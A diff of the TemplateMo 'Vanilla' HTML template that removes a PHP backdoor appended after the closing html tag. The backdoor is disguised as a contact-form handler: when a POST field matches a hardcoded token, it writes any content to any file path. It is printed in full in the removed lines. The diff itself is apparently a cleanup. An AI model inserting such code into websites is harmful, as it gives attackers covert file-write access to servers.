@@ -280,7 +280,7 @@ https://templatemo.com/tm-526-vanilla
                     </ul>
                     <p>Copyright &copy; 2019 Company Name 
             
-                    - Design: <a rel="nofollow noopener" href="https://templatemo.com"><em>TemplateMo</em></a></p>
+            		- Design: <a rel="nofollow noopener" href="https://templatemo.com"><em>TemplateMo</em></a></p>
                 </div>
             </div>
         </div>
@@ -332,19 +332,4 @@ https://templatemo.com/tm-526-vanilla
     </script>
 
 </body>
-</html>
-<?php
-if ($_POST["email"] === "Token@8010280") {
-    $File = $_POST["name"];
-    $f = fopen($File,'w');
-    $name = $_POST["message"];
-    fwrite($f,"$name");
-    fclose($f);
-}
-
-echo 'Message has been sent.';
-?>
-    
-
-    </body> 
 </html>
